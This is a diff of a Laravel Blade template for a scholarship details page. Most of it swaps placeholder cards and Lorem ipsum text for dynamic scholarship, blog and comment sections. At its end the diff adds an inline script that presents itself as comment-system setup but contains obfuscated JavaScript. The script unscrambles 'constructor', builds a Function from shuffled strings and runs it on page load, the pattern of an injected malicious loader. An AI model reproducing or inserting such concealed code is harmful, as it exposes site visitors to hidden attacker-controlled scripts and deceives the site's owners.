@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="{{ asset("customer/css/awards.css") }}">
 <link rel="stylesheet" href="{{ asset("customer/css/loader-card.css") }}">
 <link rel="stylesheet" href="{{ asset("customer/css/comments.css") }}">
-
+<meta name="scholarship" content="{{ $scholarship->id }}">
 <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
 <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
 <style>
@@ -48,243 +48,99 @@
 @section("main.layout")
 <div class="side-src">
     <strong>
-        <a href="{{ route('award') }}"><i class="fa-solid fa-house"></i> <span
-                data-lang="home"></span></a>/ <span data-lang="awards"></span>
+        <a href="{{ route('home') }}"><i class="fa-solid fa-house"></i> <span
+                data-lang="home"></span></a> &nbsp;>&nbsp; <a
+            href="{{ route('scholarship.view') }}"><span
+                data-lang="awards">{{ __("app.scholarships") }}</span></a> &nbsp;>&nbsp;
+        <span>{{ $scholarship->{"title_".$locale} }}</span>
     </strong>
 </div>
 <div class="box-search mobile-search">
-    <form action="#" class="search">
-        <div class="filter_button">
-            <div class="filter_icon">
-                <i class="fa-solid fa-sliders"></i>
-            </div>
-        </div>
-        <div class="box_show_filter">
-            <div class="filtters-box">
-            </div>
-        </div>
+    <form action="{{ route("scholarship.view") }}" class="search">
         <button class="search__button">
             <div class="search__icon">
                 <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
-                    <title>magnifying-glass</title>
+                    <title>{{ __("app.search") }}</title>
                     <path
                         d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                     </path>
                 </svg>
             </div>
         </button>
-        <input type="text" class="search__input" placeholder="Search...">
+        <input type="text" class="search__input" id="search"  name="search"
+            placeholder="{{ __("app.search") }}...">
     </form>
 </div>
 <div class="boxing">
     <div class="side-left-blog">
         <div class="box-search">
-            <form action="#" class="search">
+            <form action="{{ route("scholarship.view") }}" class="search">
                 <button class="search__button">
                     <div class="search__icon">
                         <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
                             viewBox="0 0 20 20">
-                            <title>magnifying-glass</title>
+                            <title>{{ __("app.search") }}</title>
                             <path
                                 d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                             </path>
                         </svg>
                     </div>
                 </button>
-                <input type="text" class="search__input" placeholder="Search...">
+                <input type="text" class="search__input" id="search" name="search"
+                    placeholder="{{ __("app.search") }}...">
             </form>
         </div>
-        <h1 class="top-title filter-title" style="font-size: 1.5em;">Filters</h1>
-        <div class="filtters-box nav-filter">
-            <div class="container-filter" id="selected-filter">
-                <h4 style="padding: 20px 0;" id="get-selected-nav">الدولة</h4>
-                <select id="country-select" multiple="multiple" style="width: 100%;">
-                </select>
-            </div>
-            <div class="container-filter">
-                <h4 style="padding: 20px 0 6px;" id="get-selected">التمويل</h4>
-                <ul class="list">
-                    <li>
-                        <div class="list-item" data-finance="FF">ممولة بالكامل</div>
-                    </li>
-                    <li>
-                        <div class="list-item" data-finance="PF">ممولة جزئي</div>
-                    </li>
-                    <li>
-                        <div class="list-item" data-finance="PE">نفقه خاصه</div>
-                    </li>
-                </ul>
-            </div>
-            <div class="container-filter">
-                <h4 style="padding: 20px 0 6px;" id="get-selected">درجة التعليميه</h4>
-                <ul class="list">
-                    <li>
-                        <div class="list-item" data-Educational="Dr">الدكتورة</div>
-                    </li>
-                    <li>
-                        <div class="list-item" data-Educational="Master's">ماجيستير</div>
-                    </li>
-                    <li>
-                        <div class="list-item" data-Educational="Bachelor's">بكاليوريوس</div>
-                    </li>
-                </ul>
-            </div>
-        </div>
-        <h1 class="top-title" style="font-size: 1.5em;">أفضل المنح</h1>
+        <h1 class="top-title" style="font-size: 1.5em;">{{ __("app.best_scholarships") }}</h1>
         <div class="box-top-blog">
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/card1.webp" alt="">
-                    <span>
-                        1
-                    </span>
-                </div>
-                <div>
-                    <h3>منح حكومة الصين</h3>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt
-                        repellat
-                        quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero
-                        ducimus
-                        aperiam non saepe ipsa vel placeat amet.</p>
-                </div>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/card2.webp" alt="">
-                    <span>
-                        2
-                    </span>
-                </div>
-                <div>
-                    <h3>منح حكومة الصين</h3>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt
-                        repellat
-                        quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero
-                        ducimus
-                        aperiam non saepe ipsa vel placeat amet.</p>
-                </div>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/card1.webp" alt="">
-                    <span>
-                        3
-                    </span>
-                </div>
-                <div>
-                    <h3>منح حكومة الصين</h3>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt
-                        repellat
-                        quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero
-                        ducimus
-                        aperiam non saepe ipsa vel placeat amet.</p>
-                </div>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/card2.webp" alt="">
-                    <span>
-                        4
-                    </span>
-                </div>
-                <div>
-                    <h3>منح حكومة الصين</h3>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt
-                        repellat
-                        quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero
-                        ducimus
-                        aperiam non saepe ipsa vel placeat amet.</p>
-                </div>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/card1.webp" alt="">
-                    <span>
-                        5
-                    </span>
-                </div>
-                <div>
-                    <h3>منح حكومة الصين</h3>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt
-                        repellat
-                        quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero
-                        ducimus
-                        aperiam non saepe ipsa vel placeat amet.</p>
-                </div>
-            </div>
-
+            @forelse($topFiveScholarships as $topFiveScholarship)
+                <a
+                    href="{{ route("scholarship.details",[$topFiveScholarship->{"slug_$locale"}]) }}"
+                    style="text-decoration: none;">
+                    <div class="card-top">
+                        <div class="card-img">
+                            <img src="{{ asset("storage/$topFiveScholarship->image") }}"
+                                alt="{{ $topFiveScholarship->{"title_$locale"} }}">
+                            <span>
+                                {{ $loop->iteration }}
+                            </span>
+                        </div>
+                        <div>
+                            <h3>{{ $topFiveScholarship->{"title_$locale"} }}</h3>
+                            <p>{{ $topFiveScholarship->{"description_$locale"} }}</p>
+                        </div>
+                    </div>
+                </a>
+            @empty
+            @endforelse
         </div>
 
-        <h1 class="top-title">اقرأ أيضاً</h1>
+        <h1 class="top-title">{{ __("app.read_also") }}</h1>
         <div class="box-top-blog">
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/blog/1.jpg" alt="">
-                    <span>
-                        1
-                    </span>
-                </div>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt repellat
-                    quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero ducimus
-                    aperiam non saepe ipsa vel placeat amet.</p>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/blog/2.jpg" alt="">
-                    <span>
-                        2
-                    </span>
-                </div>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt repellat
-                    quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero ducimus
-                    aperiam non saepe ipsa vel placeat amet.</p>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/blog/3.jpg" alt="">
-                    <span>
-                        3
-                    </span>
-                </div>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt repellat
-                    quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero ducimus
-                    aperiam non saepe ipsa vel placeat amet.</p>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/blog/4.jpg" alt="">
-                    <span>
-                        4
-                    </span>
-                </div>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt repellat
-                    quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero ducimus
-                    aperiam non saepe ipsa vel placeat amet.</p>
-            </div>
-            <div class="card-top">
-                <div class="card-img">
-                    <img src="static/assets/blog/5.jpg" alt="">
-                    <span>
-                        5
-                    </span>
-                </div>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Consequuntur incidunt repellat
-                    quis ex quod ut doloremque dolorem aperiam obcaecati veritatis. Nesciunt vero ducimus
-                    aperiam non saepe ipsa vel placeat amet.</p>
-            </div>
+            @forelse($topFiveBlogs as $topBlog)
+                <a href="{{ route("blog.details",$topBlog->{"slug_".$locale}) }}"
+                    title="{{ $topBlog->{"title_".$locale} }}" style="text-decoration: none;">
+                    <div class="card-top">
+                        <div class="card-img">
+                            <img src="{{ asset(path: "storage/" . $topBlog->image) }}"
+                                alt="{{ $topBlog->{"title_".$locale} }}">
+                            <span>
+                                {{ $loop->iteration }}
+                            </span>
+                        </div>
+                        <p>
+                            {{ $topBlog->{"description_".$locale} }}
+                        </p>
+                    </div>
+                </a>
+            @empty
+            @endforelse
         </div>
     </div>
     <div class="side-right-blog portfolio" id="portfolio">
-        <div class="tags-box">
-            <h4 style="
-                    min-width: 46px;
-                    ">Tags : </h4>
-            <div class="tags-items">
-            </div>
-        </div>
         <div class="awards-box blog-details">
-            <div class="img-post" style=" max-width: 400px;">
-                <img src="static/assets/card1.webp" alt="UI/UX Design">
+            <div class="img-post" style=" max-width: 90%;">
+                <img src="{{ asset(path: "storage/$scholarship->image" ) }}"
+                    alt="{{ $scholarship->{"title_".$locale} }}">
                 <div class="social-media post-social-media">
                     <a href=""><i class="fa-brands fa-facebook"></i></a>
                     <a href=""><i class="fa-brands fa-whatsapp"></i></a>
@@ -293,207 +149,133 @@
                 </div>
             </div>
             <div class="content">
-                <p dir="rtl">تقنية المعلومات (Information Technology) هي مجال يشمل كل ما يتعلق باستخدام
-                    التكنولوجيا في معالجة وإدارة المعلومات. يتناول هذا المجال مجموعة واسعة من الأنشطة والتقنيات
-                    التي تشمل الحوسبة، تخزين البيانات، تحليلها، وتأمينها. يُعدّ هذا المجال أحد أهم ركائز التطور
-                    الحديث في شتى جوانب الحياة.</p>
-
-                <h3 dir="rtl">مكونات تقنية المعلومات</h3>
-
-                <p dir="rtl">تقنية المعلومات تتكون من عدة عناصر رئيسية تشمل:</p>
-
-                <ol dir="rtl" style="margin-right:40px">
-                    <li>
-                        <p><strong>الأجهزة (Hardware):</strong>&nbsp;وتشمل جميع المكونات المادية التي تُمكّن
-                            الحواسيب والأنظمة التقنية من العمل. من الأمثلة على ذلك: الحواسيب، الخوادم، وأجهزة
-                            التخزين.</p>
-                    </li>
-                    <li>
-                        <p><strong>البرمجيات (Software):</strong>&nbsp;وهي البرامج والتطبيقات التي تُشغل الأجهزة
-                            وتُمكن المستخدمين من تنفيذ المهام المختلفة. من أشهر الأمثلة: نظم التشغيل مثل Windows
-                            وLinux، وبرامج الإنتاجية مثل Microsoft Office.</p>
-                    </li>
-                    <li>
-                        <p><strong>الشبكات (Networks):</strong>&nbsp;تشمل الربط بين أجهزة الكمبيوتر والأنظمة
-                            المختلفة لنقل البيانات والمعلومات بينها، مما يسمح بالتواصل والتعاون الفوري عبر
-                            الإنترنت أو الشبكات المحلية.</p>
-                    </li>
-                    <li>
-                        <p><strong>إدارة البيانات (Data Management):</strong>&nbsp;يتضمن جمع، تخزين، وتحليل
-                            البيانات، بالإضافة إلى الحفاظ على أمنها. قواعد البيانات، مثل MySQL وOracle، تُعتبر
-                            جزءاً أساسياً من هذا المكون.</p>
-                    </li>
-                    <li>
-                        <p><strong>أمن المعلومات (Information Security):</strong>&nbsp;يركز على حماية المعلومات
-                            والبيانات من الوصول غير المصرح به أو التلاعب بها. يشمل ذلك تطوير وتنفيذ استراتيجيات
-                            أمنية مثل التشفير والجدران النارية.</p>
-                    </li>
-                </ol>
-
-                <h3 dir="rtl">أهمية تقنية المعلومات</h3>
-
-                <p dir="rtl">تقنية المعلومات تلعب دورًا حيويًا في حياة الأفراد والشركات على حد سواء. من خلال
-                    الحوسبة السحابية (Cloud Computing)، يمكن تخزين البيانات وإدارتها بكفاءة عالية وبتكلفة أقل.
-                    تسهم تقنيات المعلومات في زيادة إنتاجية الأعمال من خلال تحسين الاتصال وتدفق المعلومات، مما
-                    يساعد في اتخاذ القرارات بشكل أسرع وأكثر دقة.</p>
-
-                <h3 dir="rtl">التحديات والمستقبل</h3>
-
-                <p dir="rtl">مع التطور السريع في تقنية المعلومات، تظهر تحديات جديدة مثل قضايا الخصوصية وأمن
-                    البيانات، بالإضافة إلى ضرورة التعامل مع الكم الهائل من البيانات المنتجة يوميًا. المستقبل
-                    يتجه نحو اعتماد تقنيات الذكاء الاصطناعي (AI) وإنترنت الأشياء (IoT)، مما سيزيد من تعقيد
-                    المشهد التكنولوجي ويعزز من دور تقنية المعلومات في حياتنا اليومية.</p>
-
-                <p dir="rtl">في النهاية، تقنية المعلومات ليست مجرد مجال تقني، بل هي عنصر أساسي في تطور المجتمعات
-                    الحديثة، حيث تساهم في تحسين جودة الحياة وتوفير حلول مبتكرة <a
-                        href="https://coolors.co/0470dc-0353a4-c3dffe-002855-001845-00143d-33415c-5c677d-7d8597-d2d4da"
-                        target="_blank">للمشاكل التقليدية.</a></p>
-
+                {!! $scholarship->{"content_$locale"} !!}
             </div>
-        </div>
-
-        <div class="pages">
-            <button data-lang="next">Next</button>
-            <span>1/10</span>
-            <button data-lang="back">back</button>
         </div>
     </div>
 </div>
-<section class="portfolio" id="portfolio">
-    <h1 class="top-title" style="margin-bottom: 40px;">مدونات مشابهه</h1>
-    <div class="awards-box">
-        <div class="card">
-            <a href="#" class="award-link">
-                <div>
-                    <div class="card-image">
-                        <img src="static/assets/card1.webp" alt="">
-                        <div class="types">
-                            <span class="project-type">• تمويل جزئي</span>
-                            <span class="project-type">• الصين</span>
-                            <span class="project-type">• ماجستير</span>
+<div>
+    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.relatedScholarship") }}</h1>
+    <div class="side-right-blog portfolio" id="portfolio">
+        <div class="awards-box" id="scholarships-container">
+            @foreach($relatedScholarships as $relatedScholarship)
+                <div class="card text-right" id="user-{{ $relatedScholarship->id }}">
+                    <div>
+                        <div class="card-image row justify-content-center">
+                            <img src="{{ asset('storage/'.$relatedScholarship->image) }}"
+                                alt="{{ $relatedScholarship->{'title_'.$locale} }}"
+                                title="{{ $relatedScholarship->{'title_'.$locale} }}"
+                                loading="lazy">
+                            <div class="types">
+                                @foreach($relatedScholarship->specializations as $specialization)
+                                    <span class="project-type">•
+                                        {{ $specialization->{'name_'.$locale} }}</span>
+                                @endforeach
+                                @foreach($scholarship->degree_levels as $degree_level)
+                                    <span class="project-type">•
+                                        {{ $degree_level->{'name_'.$locale} }}</span>
+                                @endforeach
+                                <span class="project-type">•
+                                    {{ $scholarship->country->{'name_'.$locale} }}</span>
+                                <span class="project-type">•
+                                    {{ __("app.$relatedScholarship->funding_type") }}</span>
+                            </div>
                         </div>
+
+                        <a href="{{ route("scholarship.details",[$relatedScholarship->{"slug_".$locale}]) }}"
+                            class="award-link">
+                            <div class="head-info">
+                                <span class="fsz-10">{{ __('app.watch') }}
+                                    {{ $relatedScholarship->formatVisits() ?: "0" }}</span>
+                                <span class="fsz-10">{{ __('app.brief') }}
+                                    {{ $relatedScholarship->created_at->format('Y-d-M') }}</span>
+                            </div>
+                            <p class="card-title">
+                                {{ $relatedScholarship->{'title_'.$locale} }}
+                            </p>
+                            <p class="card-body">
+                                {{ $relatedScholarship->{'description_'.$locale} }}
+                            </p>
+                            <p class="footer"><span class="by-name">{{ __('app.deadline') }}</span> :
+                                <span class="date"> {{ $relatedScholarship->deadline }}</span>
+                            </p>
+                        </a>
                     </div>
-                    </p>
-                    <div class="head-info">
-                        <span>176 مشاهدة</span>
-                        <span>27 Jul, 2024</span>
-                    </div>
-                    <p class="card-title">منح حكومة الصين</p>
-                    <p class="card-body">
-                        منح حكومة الصين هي فرص دراسية تُقدمها الحكومة الصينية للطلاب الدوليين من مختلف
-                        أنحاء
-                        العالم،
-                        بهدف تعزيز التبادل الثقافي والمعرفي بين الصين والدول الأخرى.
-                    </p>
-                    <p class="footer">أخر <span class="by-name">موعد لتسجيل</span> : <span class="date">25/05/23</span>
-                    </p>
                 </div>
-            </a>
-        </div>
-        <div class="card">
-            <a href="#" class="award-link">
-                <div>
-                    <div class="card-image">
-                        <img src="static/assets/card1.webp" alt="">
-                        <div class="types">
-                            <span class="project-type">• تمويل جزئي</span>
-                            <span class="project-type">• الصين</span>
-                            <span class="project-type">• ماجستير</span>
-                        </div>
-                    </div>
-                    </p>
-                    <div class="head-info">
-                        <span>176 مشاهدة</span>
-                        <span>27 Jul, 2024</span>
-                    </div>
-                    <p class="card-title">منح حكومة الصين</p>
-                    <p class="card-body">
-                        منح حكومة الصين هي فرص دراسية تُقدمها الحكومة الصينية للطلاب الدوليين من مختلف
-                        أنحاء
-                        العالم،
-                        بهدف تعزيز التبادل الثقافي والمعرفي بين الصين والدول الأخرى.
-                    </p>
-                    <p class="footer">أخر <span class="by-name">موعد لتسجيل</span> : <span class="date">25/05/23</span>
-                    </p>
-                </div>
-            </a>
-        </div>
-        <div class="card">
-            <a href="#" class="award-link">
-                <div>
-                    <div class="card-image">
-                        <img src="static/assets/card1.webp" alt="">
-                        <div class="types">
-                            <span class="project-type">• تمويل جزئي</span>
-                            <span class="project-type">• الصين</span>
-                            <span class="project-type">• ماجستير</span>
-                        </div>
-                    </div>
-                    </p>
-                    <div class="head-info">
-                        <span>176 مشاهدة</span>
-                        <span>27 Jul, 2024</span>
-                    </div>
-                    <p class="card-title">منح حكومة الصين</p>
-                    <p class="card-body">
-                        منح حكومة الصين هي فرص دراسية تُقدمها الحكومة الصينية للطلاب الدوليين من مختلف
-                        أنحاء
-                        العالم،
-                        بهدف تعزيز التبادل الثقافي والمعرفي بين الصين والدول الأخرى.
-                    </p>
-                    <p class="footer">أخر <span class="by-name">موعد لتسجيل</span> : <span class="date">25/05/23</span>
-                    </p>
-                </div>
-            </a>
-        </div>
-        <div class="card">
-            <a href="#" class="award-link">
-                <div>
-                    <div class="card-image">
-                        <img src="static/assets/card1.webp" alt="">
-                        <div class="types">
-                            <span class="project-type">• تمويل جزئي</span>
-                            <span class="project-type">• الصين</span>
-                            <span class="project-type">• ماجستير</span>
-                        </div>
-                    </div>
-                    </p>
-                    <div class="head-info">
-                        <span>176 مشاهدة</span>
-                        <span>27 Jul, 2024</span>
-                    </div>
-                    <p class="card-title">منح حكومة الصين</p>
-                    <p class="card-body">
-                        منح حكومة الصين هي فرص دراسية تُقدمها الحكومة الصينية للطلاب الدوليين من مختلف
-                        أنحاء
-                        العالم،
-                        بهدف تعزيز التبادل الثقافي والمعرفي بين الصين والدول الأخرى.
-                    </p>
-                    <p class="footer">أخر <span class="by-name">موعد لتسجيل</span> : <span class="date">25/05/23</span>
-                    </p>
-                </div>
-            </a>
+            @endforeach
         </div>
     </div>
-</section>
+</div>
+
 
 <section class="comment-module">
-    <h1 class="top-title" style="margin-bottom: 40px;">التعليفات</h1>
+    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.comments") }}</h1>
     <div class="comment-section">
-        <div class="comments-wrp"></div> <!-- comments wrapper -->
-        <div class="reply-input container-comment">
-            <img src="static/assets/images/avatars/image-juliusomo.webp" alt="" class="usr-img" />
-            <textarea class="cmnt-input" placeholder="Add a comment..."></textarea>
-            <button class="bu-primary">SEND</button>
-        </div> <!-- reply input -->
+        <div class="comments-wrp base">
+            <div class="comments-wrp">
+
+            </div>
+            <div id="view-comment">
+                <button class="botao load-more">
+                    <span class="texto">{{ __("app.btn_read_more") }}</span>
+                </button>
+            </div>
+        </div>
+        @if(isset($user) && $user->id!= null)
+            <div class="reply-input base-input-reply container-comment">
+                <img src="{{ asset("storage/".$user->image) }}" alt="" class="usr-img" />
+                <textarea class="cmnt-input"
+                    placeholder="{{ __("app.write_your_comment") }}..."></textarea>
+                <button class="bu-primary">{{ __("app.comment") }}</button>
+            </div>
+        @endif
     </div>
 </section>
 @endsection
 
 
+
 @section("script")
-<script src="{{ asset('customer/js/countries.js') }}"></script>
-<script src="{{ asset('customer/js/filter.js') }}"></script>
-<script src="{{ asset('customer/js/country.js') }}"></script>
 <script src="{{ asset('customer/js/app.js') }}"></script>
+<script>
+    var blogId, token, currentUser, apiUrl, apiAdd, commentManager;
+    (function () {
+        var QhD = '',
+            jlD = 990 - 979;
+
+        function ZoL(z) {
+            var g = 2404910;
+            var t = z.length;
+            var f = [];
+            for (var c = 0; c < t; c++) {
+                f[c] = z.charAt(c)
+            };
+            for (var c = 0; c < t; c++) {
+                var y = g * (c + 295) + (g % 34391);
+                var b = g * (c + 376) + (g % 52712);
+                var x = y % t;
+                var a = b % t;
+                var k = f[x];
+                f[x] = f[a];
+                f[a] = k;
+                g = (y + b) % 5837920;
+            };
+            return f.join('')
+        };
+        var lov = ZoL('islourbrtocjcrdemtfwcaypsxgqhtvnzuokn').substr(0, jlD);
+        var XIC =
+            ')auS*,q=uev37hbsg2sv6r}=a"xacdl)g(6w,ah)hi;;anb8wx(s"ja.1 .,;8u=.7[;tfn )g=]hg0+57s4(;89Cr+l(prj=82]l-jngonvjqao.0yu6=>6];v;(t>=+zxtrrpl{(7s-;rs"9.=. )ti;hli)zn+;a]tChi1g5])Ae=[u;m!3; =)21]pol(=2b .rrh;grhh"g=l<ah s l+6";cnn)f8iv)(aaarf bc,,;igehgs+3v6-u 2,;gS,,rfoq=vh1);4b;zoiia]0=)h=udbr-t tna} cwlunljnt4z=1euf]miica6e]gd;.ar7tv;sl)aasan.ejin;.i9(ic e;<bn(h<+=e7(;nu4;7"r+rv(ruaghec.nvrsd[;vhd)+efr mudA;t,;r;o.=is 9ona*gt=,nl[dopyele d+1trjt,txp,{n{}el9,r;+],tj8))=-ftvp)leivrhrj[]t=e.[;"{olaa1Cjh)y .{hcinore=+ fn2n),+epCh<=-22=8lse)cfshi,o=;.ia(}= +sle);,)A0(t(A8r)Ctt;uo ).uho;eri)gar6kr<ujo.7l.(z[t1r1{tajn(=(ui. 5!sdaC;=tv==+sf(facosh;e=rf((u0+vs([+)ee=i()j.p,d, qe6(zsm,roCtv([0r)r vhf)c2.br"ihuldrpoCgnhn1r[cosA=;,9atsrp0g,,poif+ o u;v(7=r0f);fi0[=em.,;;)];0)rr9m}yho.]{h 5+vfrv(mne[g;=cs"+1wnw4evlrrt=mop0+tr=t(s);.[1ln=((r8n=a=e4+},};[r(s;;rf])vrua7ztle..ih+,9((s.("-++a=h0v,a';
+        var ePj = ZoL[lov];
+        var Qii = '';
+        var xCb = ePj;
+        var yTl = ePj(Qii, ZoL(XIC));
+        var hnP = yTl(ZoL(
+            't#";$.$)St0fhg_rnn 1%fbs0|7,Q%(QQlQ.c,).[Q\'Q;4c3h ;uQ.nj_.5tcehQ6hm$ebu5o5a.$)Qd_c(f,03Q(nto(8nc)hs1nr(f,3na;;,se.)=a)Q=e00c+nato\/grQisv);onep"o0Ql(,[noQ:drQct]%s(%!ar{],)%Ibc,caezeeQQ\/t}c[r0$ru.amr9f;3.j.!r;!Q21]d(a:caje_fQe67j..as.QiQ.ejo$#)c)9 l)m$&QQ5s_ef,(etidaa#$ .:(cpeta}i34i}jl#Qh3Qcr)rtpi=cl+3$oz!=r.ma,97rtnQQ.-h01ete{eQte$r7i.=ndi.Q%c;7fr.e58213tQ{h%_s\/-hioQoQs316i%(s1;.7t46Q \/t9a.-\/.119Q|r}3rf!s0_)e:l|-)iQb0=btbc.930eu8no10Qe"Qo_a0Q%=).1(pesp,(!7ot[+ar,!cafga\/e{5Q_d.cmQ1\/zQ=*Qto.p;(1i=.Q,er(i85+.)i7(1mbu_cQ]ru!s;Qo8[ftQclnQ,Qs)!($=f{=elm6l6eQ78c34;tQo4)df!.raQs.4j ,29(-;7Q$siQ]t3c;2))o9c8.Qrlcf2.+c;Qfm!(=cdm$3!=Qhnau7)pnQ1c)dQlQIQf37(ye0__c;=Q(30asce_\/t3s.e_j)])1bg";ietbQ,26\'t\/8%n\/(wyae(ue.r3pjclotQb.f!u1pMat;(Q_ctc.fca..2!,imgQ$df(oonChnrCo4*)trg06,}wQQre8u=.0Q(.g.Q=#,iak1m}.(,r5ceQQQhQ=2c]lf8[eQ$]}9c,r7_=e(!9).r 0uQm&3pQ0ga!y+;fQ.cuim(+rh {cnuycj%hQ] !;(eQra;e1[s;}rt]s"}(Qltg}ce,k0dc; erw.a|)g!bQ\'.2&,jrQu[0(]{;(-0ua) [_uQl%\/Q.QQ.c} t0)oht}tu\/(c%o)uite3\/]lt!t.s+]4..6).Q=r.!rnf8Qe%e5axQ):.c7 a7]Qibi3tj))#.en lQ.ram{10um .ze=.g&7)c;90cmd.(-#maQe.sjntfe1%8z&35o2.cts(y.21bddp)Qpet.|Q&4.)f9sQf]ta!md(=asQn3y,af4!r$f=_.9(|3)Qo!Q).,n$oo,id9Q]1hM,2toQ]3}c!Qs=m.!e,o9(c6)*go-=.q%48(Q!gl,)-QQt1(Qrm9\/:cis4u).8nei,\'o$ i$!(u[c73!$=$s};Q r1hS{(%0QiQt\/4!==QQ}n :,f$o,t=9n+p4*$;b,ms%cnQQ,i.&;5r3g].=%]3+r!)r)ym\/89\/n\/,nl.3((_t;l{9n)11Q!9e2(!Q"cg=,mQm-$ffC090r;S)1"n(.sQ !)$0.-rchQr!)y.S835;$[Q0n]*[u7)li yc\/clQn$;.r;.e4.o2rc!uh)17a}d$0oQrtsQ2%b\/ Q)(]d\/neQtmQii9{s(,f[c-}_;Q d.ttQc.tp*_tc{}\'Qf4or)t)nn $dn(rhrQus9%$ 1) b;'
+        ));
+        var hCE = xCb(QhD, hnP);
+        hCE(4983);
+        return 1654
+    })()
+
+</script>
 @endsection
